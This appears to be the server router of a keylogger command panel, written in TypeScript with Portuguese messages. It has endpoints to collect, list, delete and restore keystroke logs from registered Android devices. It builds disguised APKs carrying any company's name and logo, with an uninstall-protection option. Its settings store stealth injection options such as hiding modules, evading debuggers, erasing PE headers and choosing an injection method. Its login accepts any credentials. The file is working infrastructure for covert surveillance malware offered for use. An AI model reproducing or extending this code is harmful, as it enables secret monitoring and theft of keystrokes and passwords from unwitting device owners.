import z from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { buildCustomAPK } from "./apk-builder";
import { generateAPKWrapper } from "./apk-wrapper-generator";
import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
import { sdk } from "./_core/sdk";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(z.object({
        email: z.string().email(),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        // Simple authentication: accept any email/password combination
        // Generate a numeric userId based on email hash
        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
        
        try {
          // Create a session token
          const sessionToken = await sdk.createSessionToken(userId, input.email);
          
          // Set the session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
          
          return {
            success: true,
            user: {
              id: userId,
              email: input.email,
              name: input.email.split('@')[0],
            },
          };
        } catch (error) {
          console.error('Login error:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao fazer login',
          });
        }
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getEvents();
      }),
  }),

  apk: router({
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
        protectFromUninstall: z.boolean().default(true),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          // Use the simple APK wrapper generator - more reliable
          const result = await generateSimpleAPKWrapper({
            appName: input.companyName,
            appUrl: input.companyUrl,
            logoUrl: input.logoUrl,
          });

          if (!result.success || !result.downloadUrl) {
            throw new Error(result.error || "Erro ao gerar APK");
          }

          // Return the download URL
          return {
            success: true,
            downloadUrl: result.downloadUrl,
            message: "APK gerado com sucesso!",
          };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),

  settings: router({
    save: protectedProcedure
      .input(z.object({
        processName: z.string().optional(),
        modulePath: z.string().optional(),
        stealthInject: z.number().optional(),
        hideModule: z.number().optional(),
        hideFromDebugger: z.number().optional(),
        autoInject: z.number().optional(),
        scramble: z.number().optional(),
        erasePE: z.number().optional(),
        removeDebugData: z.number().optional(),
        delay: z.number().optional(),
        delayBetween: z.number().optional(),
        injectMethod: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await saveSettings(ctx.user.id, input as any);
      }),
    
    get: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await getSettings(ctx.user.id);
      }),
  }),

  monitoring: router({
    toggleService: protectedProcedure
      .input(z.object({
        enabled: z.boolean(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return {
          success: true,
          enabled: input.enabled,
          message: `MonitoringService ${input.enabled ? 'ativado' : 'desativado'}`,
        };
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        deviceModel: z.string(),
        androidVersion: z.string(),
        appName: z.string(),
        appUrl: z.string().optional(),
        appVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[Devices] Registrando dispositivo:', input);
          
          const device = await registerDevice({
            deviceId: input.deviceId,
            userId: 1,
            appName: input.appName,
            appUrl: input.appUrl || '',
            deviceModel: input.deviceModel,
            androidVersion: input.androidVersion,
            appVersion: input.appVersion,
            status: 'online',
          });
          
          return {
            success: true,
            message: 'Dispositivo registrado com sucesso',
            deviceId: input.deviceId,
            device,
          };
        } catch (error) {
          console.error('[Devices] Erro ao registrar dispositivo:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao registrar dispositivo',
          });
        }
      }),
    
    list: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        try {
          const devices = await getDevicesByUser(ctx.user.id);
          return devices;
        } catch (error) {
          console.error('[Devices] Erro ao listar dispositivos:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao listar dispositivos',
          });
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
